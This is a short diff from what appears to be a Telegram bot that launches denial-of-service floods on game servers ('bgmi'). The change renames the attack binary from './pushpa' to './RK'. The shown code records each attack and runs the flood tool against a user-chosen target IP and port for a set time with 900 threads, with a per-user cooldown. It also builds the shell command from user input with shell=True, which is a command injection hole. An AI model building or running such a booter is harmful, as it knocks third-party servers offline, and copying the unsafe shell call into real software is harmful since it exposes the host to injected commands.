@@ -151,10 +151,10 @@ def handle_bgmi(message):
                 response = "❌ 𝙴𝚛𝚛𝚘𝚛: 𝚘𝚗𝚕𝚢 𝚢𝚘𝚞 𝚌𝚊𝚗 𝚞𝚜𝚎 𝚝𝚘 240 𝚜𝚎𝚌𝚘𝚗𝚍𝚜."
             else:
                 # Record the attack and start the process
-                record_command_logs(user_id, '/pushpa', target, port, time)
+                record_command_logs(user_id, '/RK', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)
-                subprocess.run(f"./pushpa {target} {port} {time} 900", shell=True)
+                subprocess.run(f"./RK {target} {port} {time} 900", shell=True)
                 
                 # Set the cooldown based on the attack time (in seconds)
                 bgmi_cooldown[user_id] = datetime.datetime.now() + datetime.timedelta(seconds=time)
